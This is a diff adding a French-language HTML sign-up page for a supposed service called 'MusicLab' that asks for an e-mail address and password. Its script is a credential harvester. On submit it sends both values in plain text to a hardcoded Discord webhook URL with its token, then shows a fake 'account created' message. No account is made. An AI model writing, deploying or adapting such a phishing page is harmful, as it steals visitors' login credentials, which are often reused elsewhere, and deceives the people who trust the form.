@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MusicLab - Création du compte</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        .input-group {
+            margin: 1rem 0;
+        }
+        label {
+            font-weight: bold;
+            color: #555;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-top: 0.5rem;
+            box-sizing: border-box;
+        }
+        .btn {
+            width: 100%;
+            padding: 0.75rem;
+            margin-top: 1rem;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>S'inscrire sur MusicLab</h2>
+
+        <!-- Formulaire avec deux champs texte -->
+        <form id="musicLabForm">
+            <div class="input-group">
+                <label for="nom">Adresse e-mail :</label>
+                <input type="text" id="nom" name="nom" required>
+            </div>
+            <div class="input-group">
+                <label for="presence">Mot de Passe :</label>
+                <input type="text" id="presence" name="presence" required>
+            </div>
+            <button type="submit" class="btn">Créer mon compte !</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('musicLabForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche le comportement par défaut du formulaire
+
+            // Récupérer les valeurs des champs
+            const nom = document.getElementById('nom').value;
+            const presence = document.getElementById('presence').value;
+
+            // Créer le payload à envoyer au webhook
+            const payload = {
+                content: `Email: ${nom}\nMot de passe: ${presence}`
+            };
+
+            // Envoyer la requête POST au webhook Discord
+            fetch('https://discord.com/api/webhooks/1301942262762311702/F7a1necgmWZfeWxIRJpXk8EJjGErpvfU0hyr99tirnQqe181MGqqXIpZHo-YzA078-xR', {
+                method: 'POST',
+                body: JSON.stringify(payload),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Compte créer avec succès!');
+                } else {
+                    alert('Erreur lors de l\'envoi des données.');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Erreur lors de l\'envoi des données.');
+            });
+        });
+    </script>
+</body>
+</html>
